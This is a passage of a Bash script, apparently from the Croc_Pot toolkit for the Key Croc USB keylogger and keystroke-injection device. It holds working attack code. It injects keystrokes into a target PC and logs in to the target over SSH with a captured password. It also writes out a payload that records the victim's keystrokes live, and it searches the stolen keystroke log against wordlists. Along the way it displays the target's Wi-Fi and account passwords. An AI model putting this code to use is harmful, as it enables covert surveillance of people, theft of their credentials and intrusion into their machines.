		15) Q CONTROL-o ; echo -ne " CTRL-O " ;;
		16) Q CONTROL-p ; echo -ne " CTRL-P " ;;
		17) Q CONTROL-q ; echo -ne " CTRL-Q " ;;
		18) Q CONTROL-r ; echo -ne " CTRL-R " ;;
		19) Q CONTROL-s ; echo -ne " CTRL-S " ;;
#		20) Q CONTROL-t ; echo -ne " CTRL-T " ;;
		20) Q CONTROL-TAB ; echo -ne " CTRL-TAB " ;;
		21) Q CONTROL-u ; echo -ne " CTRL-U " ;;
		22) Q CONTROL-v ; echo -ne " CTRL-V " ;;
		23) Q CONTROL-w ; echo -ne " CTRL-W " ;;
		24) Q CONTROL-x ; echo -ne " CTRL-X " ;;
		25) Q CONTROL-y ; echo -ne " CTRL-Y " ;;
	esac ;;
esac
done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; remote_keyboard ;;
esac
}
##
#----Quack Explore command Menu
##
MenuTitle QUACK EXPLORE MENU ; MenuColor 21 1 QUACK TARGET TERMINAL ; MenuColor 21 2 QUACK OVER SSH ; MenuColor 21 3 QUACK TARGET PC ; MenuColor 21 4 PAYLOAD STARTER
MenuColor 21 5 REMOTE REPLACE ; MenuColor 21 6 KEYBOARD ACTIVITY ; MenuColor 21 7 REMOTE KEYBOARD ; MenuColor 21 8 RETURN TO MAIN MENU ; MenuEnd 24
	case $m_a in
	1) q_terminal ; insert_quack ;; 2) q_ssh ; insert_quack ;; 3) q_target ; insert_quack ;; 4) remote_payload ; insert_quack ;;
	5) remote_replace ; insert_quack ;; 6) kb_activity ; insert_quack ;; 7) remote_keyboard ; insert_quack ;; 8) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; insert_quack ;;
	esac
}
##
#----Croc Pot Plus Menu
##
function menu_B() {
	clear
croc_title ; sleep 2 ; tput cup 8 0 ; MenuTitle CROC_POT PLUS MENU ; MenuColor 20 1 RECON SCAN MENU ; MenuColor 20 2 CROC VPN SETUP ; MenuColor 20 3 PASS TIME GAMES
MenuColor 20 4 INSTALL PAYLOADS ; MenuColor 20 5 O.MG CABLE MENU ; MenuColor 20 6 QUACK EXPLORE ; MenuColor 20 7 RETURN TO MAIN MENU ; MenuEnd 23
	case $m_a in
	1) croc_recon ; menu_B ;; 2) croc_vpn ; menu_B ;; 3) pass_time ; menu_B ;; 4) install_payloads ; menu_B ;; 5) omg_cable ; menu_B ;;
	6) insert_quack ; menu_B ;; 7) main_menu ;; [pP]) Panic_button ;; kp | KP) start_ping ; menu_B ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; menu_B ;;
	esac
}
menu_B
}
##
#----Croc status menu/functions
##
function croc_status() {
	local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
##
#----status Install screenfetch 
##
	install_package screenfetch SCREENFETCH croc_status
##
#----status Display screenfetch 
##
	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n"
	screenfetch 2> /dev/null
	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
	local server_name=$(hostname)
memory_check() {
	clear
	rm ${LOOT_INFO}
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}MEMORY STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'Memory usage on') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; df -h | xargs | awk '{print "Free/total disk: " $11 " / " $9}' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	egrep --color=auto 'Mem|Cache|Swap' /proc/meminfo | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; free -t -m | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; cat /proc/meminfo | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	vmstat | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; df -h | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; iostat | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	echo -ne "${cyan}KEYCROC-DIRECTORY${clear}\n" | tee -a ${LOOT_INFO} ; cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
}
cpu_check() {
	clear
	rm ${LOOT_INFO}
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}CPU STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'CPU load on') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	more /proc/cpuinfo && lscpu | grep MHz --color=auto | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	echo "Threads/core: $(nproc --all)" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; echo "Number of CPU/cores online at $HOSTNAME: $(getconf _NPROCESSORS_ONLN)" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	echo -ne "CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
}
tcp_check() {
	clear
	rm ${LOOT_INFO}
	install_package speedtest-cli SPEEDTEST-CLI tcp_check
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}NETWORK STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'Network/connections on') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	netstat -l | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; netstat -r | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; netstat -tunlp | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; iw dev wlan0 link | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	iw wlan0 scan | egrep --extended-regexp 'BSS ([[:xdigit:]]{1,2}:)|signal: |SSID: |\* Manufacturer: |\* Model Number: |\* Serial Number: |\* Device name: ' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	arp -a -e -v | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; ss -p -a | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; for interface in $(ls /sys/class/net/); do echo -ne "${interface}\n"; done | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; /sbin/ifconfig -a | tee -a ${LOOT_INFO}
	echo ${LINE} | tee -a ${LOOT_INFO} ; curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; speedtest | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
}
kernel_check() {
	clear
	rm ${LOOT_INFO}
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}KERNEL STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'Kernel version on') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	uname --all | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; hostnamectl | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; cat /proc/version | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
}
processes_check() {
	clear
	rm ${LOOT_INFO}
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}PROCESSES STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "${yellow}Last logins:${clear}\n" | tee -a ${LOOT_INFO} ; last -a | head -3 | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'Running Processes') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	ps -aux | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; service --status-all | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; findmnt -A | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; usb-devices | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
}
##
#----Status check all KeyCroc info
##
all_checks() {
	clear
	rm ${LOOT_INFO}
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}ALL CHECK STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
echo -ne "\t${LINE_}KEYCROC INFO${LINE_}\n${LINE}\nCROC FIRMWARE: $(cat /root/udisk/version.txt)\nKEYCROC CONFIG SETTING:\n$(sed -n '/^[DWS]/p' /root/udisk/config.txt)\n${LINE}\nUSER NAME: $(whoami)\nHOSTNAME: $(cat /proc/sys/kernel/hostname)
IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nPUBLIC IP: $(curl ifconfig.co)\nMAC ADDRESS: $(ip -o link | awk '$2 != "lo:" {print $2, $(NF-2)}')\n${LINE}\nVARIABLES CURRENT USER:\n$(env)\n${LINE}\n
INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /tmp/mode)\nSSH: root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nDNS: $(sed -n -e 4p /etc/resolv.conf)\nDNS: $(sed -n -e 5p /etc/resolv.conf)\nDISPLAY ARP: $(ip n)\n${LINE}\nROUTE TALBE: $(ip r)\nNETWORK:\n$(ifconfig -a)\n${LINE}\nSYSTEM UPTIME: $(uptime)\n
SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(usb-devices)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n$(CHECK_PAYLOADS)\n${LINE}" >> ${LOOT_INFO} ; curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com ; echo "${LINE}"
	cat ${LOOT_INFO}
}
##
#----Status of target pc info
##
pc_info() {
	clear
	local TARGET_USERNAME=$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
if [ "$(OS_CHECK)" = WINDOWS ]; then
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}TARGET PC INFO${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:')${green} $(OS_CHECK)${clear}
$(ColorYellow 'Target PC Host name:')${green} $(sed -n 3p ${CROC_OS})${clear}
$(ColorYellow 'Target PC Passwd:')${green} $(target_pw)${clear}
$(ColorYellow 'Target Pc user name:')${green} $(sed -n 1p ${CROC_OS_TARGET})${clear}
$(ColorYellow 'Target Pc IP:')${green} $(sed '2,6!d' ${CROC_OS_TARGET})${clear}\n${LINE}
$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')${green}
$(sed '9,24!d' ${CROC_OS_TARGET})${clear}\n${LINE}\n" | tee -a ${LOOT_INFO}
sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2> /dev/null | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {systeminfo}"' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
elif [ "$(OS_CHECK)" = LINUX ]; then
	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}TARGET PC INFO${LINE_}\n" | tee -a ${LOOT_INFO}
	echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:')${green} $(OS_CHECK)${clear}
$(ColorYellow 'Target PC Host name:')${green} $(sed -n 3p ${CROC_OS})${clear}
$(ColorYellow 'Target PC Passwd:')${green} $(target_pw)${clear}
$(ColorYellow 'Target Pc user name:')${green} $(sed -n 1p ${CROC_OS_TARGET})${clear}
$(ColorYellow 'Target Pc IP:')${green} $(sed -n '2,3p' ${CROC_OS_TARGET})${clear}\n${LINE}
$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')${green} 
$(sed '4,20!d' ${CROC_OS_TARGET})${clear}\n${LINE}\n" | tee -a ${LOOT_INFO}
sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'hostnamectl ; echo "'${LINE}'" ; netstat -r' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
echo -ne "${cyan}TARGET PC-DIRECTORY${clear}\n" | tee -a ${LOOT_INFO} ; sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'${yellow}'Directory: '${clear}''${cyan}'${i} '${clear}''${yellow}'Contains: '${clear}''${green}'${g} '${clear}''${yellow}'files.'${clear}'\n"; done 2> /dev/null' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
else
	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET TARGET PC USER NAME AND IP')"
fi
}
##
#----Status keystrokes croc_char.log file menu/function
##
key_file() {
	echo -ne "$(Info_Screen '
-Keycroc loot/croc_char.log file
-Scan loot/croc_char.log for match word/pattern
-View live keystrokes')\n"
keyboard_check
echo -ne "${yellow}Currently found ${clear}${green}$(cat /root/udisk/loot/croc_char.log | wc -m) ${clear}${yellow}characters in croc_char.log${clear}\n\n"
##
#----View Live keystrokes with payload
##
keystrokes_V() {
	clear
	echo -ne "$(Info_Screen '
-View Live keystrokes with payload
-This will install a payload called Live_Keystroke.txt in payload folder
-After payload has installed reload payload with (RELOAD_PAYLOADS) command
-Option to open target pc terminal and run (RELOAD_PAYLOADS) command or
manually enter (RELOAD_PAYLOADS; exit) in keycroc terminal
-Then we can run (tail -f /tmp/livekey.txt) command to view live keystrokes
-Run Live_Keystroke.txt payload as standalone ssh into keycroc and enter
    tail -f /tmp/livekey.txt

-NOTE: With Live_Keystroke.txt payload installed in keycroc payload folder
       NO OTHER PAYLOADS WILL EXECUTE BY KEYBOARD
-Recommended to uninstall payload when not in use, do to match word
-Press F1 to remove Live_keystroke payload and run RELOAD_PAYLOADS command 
-PRESS CONTROL + C TO EXIT live keylog')\n\n"
	read_all START LIVE KEYLOG Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	if [ -e "/root/udisk/payloads/Live_keystroke.txt" ]; then
		echo -ne "\n$(ColorGreen 'Live_keystroke PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Live_keystroke.txt ; echo -ne "\n${LINE}\n"
		clear
		echo -ne "\n\t\t${yellow}keystrokes will display here${clear}\n"
		WAIT_FOR_KEYBOARD_ACTIVITY 1
		tail -f /tmp/livekey.txt
	else
		read_all INSTALL LIVE_KEYSTROKE PAYLOAD Y/N AND PRESS [ENTER]
		case $r_a in
		[yY] | [yY][eE][sS])
	echo -ne "# Title:         Live_keystroke\n#\n# Description:   Save keystroke entry to tmp/livekey.txt\n#                This payload is to be used with CROC_POT to view live keystroke\n#                Ran as standalone ssh into keycroc and enter tail -f /tmp/livekey.txt\n#                Recommended to uninstall payload when not in use, do to match word
#                Press F1 to remove Live_keystroke payload and run RELOAD_PAYLOADS command\n#\n# Author:        Spywill\n# Version:       1.2\n# Category:      Key Croc\n
MATCH (SHIFT|CONTROL|BACKSPACE|ENTER|RIGHTARROW|LEFTARROW|UPARROW|DOWNARROW|TAB|GUI|ALT|DELETE|F1|F2|F3|F4|F5|HOME|DELETE|ESCAPE|END|INSERT|PAGEUP|PAGEDOWN)\nMATCH ([0-9]|[a-z]|[A-Z]|[\`~!@#\$%^&*()_+=|;:',<\\\.>?/-]|[{]|[}]|[\"]|[ ])\n\nif [[ \"\$LOOT\" == \"SHIFT\" ]]; then\n	echo -ne \" SHIFT \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"HOME\" ]]; then\n	echo -ne \" HOME \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"END\" ]]; then\n	echo -ne \" END \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"CONTROL\" ]]; then\n	echo -ne \" CONTROL \" >> /tmp/livekey.txt
elif [[ \"\$LOOT\" == \"PAGEUP\" ]]; then\n	echo -ne \" PAGEUP \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"INSERT\" ]]; then\n	echo -ne \" INSERT \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	echo -ne \" DELETE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"BACKSPACE\" ]]; then\n	echo -ne \"\\\b \\\b\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"ENTER\" ]]; then\n	echo -ne \" ENTER\\\n\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"RIGHTARROW\" ]]; then\n	echo -ne \"\\\U1F812\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"LEFTARROW\" ]]; then\n	echo -ne \"\\\U21FD\" >> /tmp/livekey.txt
elif [[ \"\$LOOT\" == \"UPARROW\" ]]; then\n	echo -ne \"\\\U2191\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"DOWNARROW\" ]]; then\n	echo -ne \"\\\U2193\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"TAB\" ]]; then\n	echo -ne \" TAB \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"GUI\" ]]; then\n	echo -ne \" GUI \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"ESCAPE\" ]]; then\n	echo -ne \" ESCAPE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"PAGEDOWN\" ]]; then\n	echo -ne \" PAGEDOWN \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"ALT\" ]]; then\n	echo -ne \" ALT \" >> /tmp/livekey.txt
elif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	echo -ne \" DELETE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F1\" ]]; then\n	rm /root/udisk/payloads/Live_keystroke.txt\n	RELOAD_PAYLOADS\nelif [[ \"\$LOOT\" == \"F2\" ]]; then\n	echo -ne \" F2 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F3\" ]]; then\n	echo -ne \" F3 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F4\" ]]; then\n	echo -ne \" F4 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F5\" ]]; then\n	echo -ne \" F5 \" >> /tmp/livekey.txt\nelse\n	echo -ne \"\$LOOT\" >> /tmp/livekey.txt\nfi\n" >> /root/udisk/payloads/Live_keystroke.txt
		echo -ne "\n$(ColorGreen 'Live_keystroke PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')${clear}\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Live_keystroke.txt ; echo -ne "\n${LINE}\n"
##
#----Start second terminal on target pc to reload payload for (Live_Keystroke.txt)
#----manually enter (RELOAD_PAYLOADS; exit) to reload payload
##
	echo -ne "$(Info_Screen '
-After payload has installed need to reload payload
Choose manually enter [ RELOAD_PAYLOADS; exit ] in keycroc terminal
Choose terminal will open terminal on target pc
Choose exit will need to unplug keycroc then plug back in')\n\n"
			read_all RELOAD PAYLOAD [M]-MANUALLY [T]-TARGET TERMINAL [E]-EXIT
			case $r_a in
			[tT])
				if [ "$(OS_CHECK)" = WINDOWS ]; then
					Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 3 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
					Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d
				else
					case $HOST_CHECK in
					raspberrypi)
						Q CONTROL-ALT-t ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
						Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q CONTROL-ALT-d ;;
					$HOST_CHECK)
						Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
						Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d ;;
					*)
						Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
						Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d ;;
					esac
					clear
					echo -ne "\n\t\t${yellow}keystrokes will display here${clear}\n"
					WAIT_FOR_KEYBOARD_ACTIVITY 1
					tail -f /tmp/livekey.txt
				fi ;;
			[mM])
				sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -o "StrictHostKeyChecking no" root@localhost
				read_all START LIVE KEYSTROKE Y/N AND PRESS [ENTER]
				case $r_a in
				[yY] | [yY][eE][sS])
					clear
					echo -ne "\n\t\t${yellow}keystrokes will display here${clear}\n"
					WAIT_FOR_KEYBOARD_ACTIVITY 1
					tail -f /tmp/livekey.txt ;;
				[nN] | [nN][oO])
					echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
				*)
					invalid_entry ; keystrokes_V ;;
				esac ;;
			[eE])
				echo -ne "\n${yellow}Unplug keycroc and plug back in${clear}\n" ; exit ;;
			*)
				invalid_entry ; keystrokes_V ;;
			esac ;;
		[nN] | [nN][oO])
			echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
		*)
			invalid_entry ; keystrokes_V ;;
		esac
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; keystrokes_V ;;
esac
}
##
#----Check keycroc keystroke log file (loot/croc_char.log) for match word/pattern
##
word_check() {
	clear
	echo -ne "$(Info_Screen '
-Scan keystroke log file at loot/croc_char.log For match word/pattern
-Enter match word/pattern')\n\n"
	read_all START MATCH WORD/PATTERN SCAN Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER WORD/PATTERN AND PRESS [ENTER] ; local M_W=${r_a}
	if [ `cat /root/udisk/loot/croc_char.log | sed -n 's/.*\('${M_W}'\).*/\1/p'` 2> /dev/null = ${M_W} ]; then
		echo -ne "${yellow}Found match word/pattern in loot/croc_char.log${clear}\n${green}${M_W}${clear}${yellow} count:${clear}${green}$(grep -o ''${M_W}'' /root/udisk/loot/croc_char.log | wc -w)${clear}\n"
	else
		echo -ne "${yellow}Did not find match word/pattern in loot/croc_char.log${clear}\n${red}${M_W}${clear}\n"
	fi
	sleep 2 ; word_check ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; word_check ;;
esac
}
##
#----Check keycroc keystroke log file (loot/croc_char.log) with word list
##
list_check() {
	clear
	echo -ne "$(Info_Screen '
-Scan keystroke log file at loot/croc_char.log For match word/pattern
with word list')\n\n"
	install_package wamerican-huge AMERICAN_WORDLIST list_check
	read_all START MATCH WORD-LIST SCAN Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "${yellow}Enter the full path of word list or use /usr/share/dict/american-english-huge${clear}\n"
	read_all ENTER FULL PATH OF WORD LIST LOCATION AND PRESS [ENTER]
	if [ -f "${r_a}" ]; then
		echo -ne "${yellow}Word list was located${clear}\n"
		local U_L=${r_a}
	else
		invalid_entry ; echo -ne "\n${red}Did not find Word list please try again${clear}\n" ; list_check
	fi
	reset_broken
	while IFS= read -r word; do
		LED B
		if [ ${word} = `sed -n 's/.*\('${word}'\).*/\1/p' /root/udisk/loot/croc_char.log` 2> /dev/null ]; then
			LED G
			echo -ne "${yellow}Found match word/pattern in loot/croc_char.log${clear}\n${green}${word} ${clear} ${yellow}count:${clear}${green}$(grep -o ''${word}'' /root/udisk/loot/croc_char.log | wc -w)${clear}\n"
		elif [ $broken -eq 1 ]; then
			break
		else
			LED R
			echo -ne "${yellow}Did not find match word/pattern in loot/croc_char.log${clear}\n${red}${word}${clear}\n"
		fi
	done < <(cat ${U_L}) ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; list_check ;;
esac
}
##
#----View keycroc loot/croc_char.log file
##
view_key() {
	clear
	echo -ne "$(Info_Screen '
-View Keycroc keystroke log file at (loot/croc_char.log)
-View croc_char.log filter out [ENTER] [BACKSPACE]..ect
-View loot/croc_raw.log and loot/matches.log
-This will enter (ARMING_MODE) to sync (loot/croc_char.log)')\n\n"
	read_all VIEW LOOT/CROC CHAR.LOG Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	ARMING_MODE
	sleep 5
	ATTACKMODE HID
	sleep 5
